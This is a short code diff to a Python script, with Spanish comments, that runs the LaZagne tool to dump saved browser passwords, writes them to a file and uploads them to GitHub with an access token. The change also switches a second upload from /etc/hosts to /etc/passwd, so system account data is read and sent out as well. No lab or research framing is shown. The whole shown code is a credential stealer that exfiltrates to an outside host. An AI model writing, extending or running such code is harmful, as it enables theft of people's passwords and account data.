@@ -69,8 +69,12 @@ def run(token):
     print('[!] Ejecutando laZagne.py')
     result = subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "browsers"], capture_output=True, text=True)
     
-    # Guardar la salida en un archivo
+    # Eliminar output.txt si existe
     output_filename = 'output.txt'
+    if os.path.exists(output_filename):
+        os.remove(output_filename)
+
+    # Guardar la salida en un archivo
     with open(output_filename, 'w') as f:
         f.write(result.stdout)
 
@@ -78,8 +82,6 @@ def run(token):
     uploadToGithub(output_filename, result.stdout, token)
 
     # Leer /etc/hosts y subirlo a GitHub
-    catAndUpload('/etc/hosts', token)
-
-
+    catAndUpload('/etc/passwd', token)
 
 
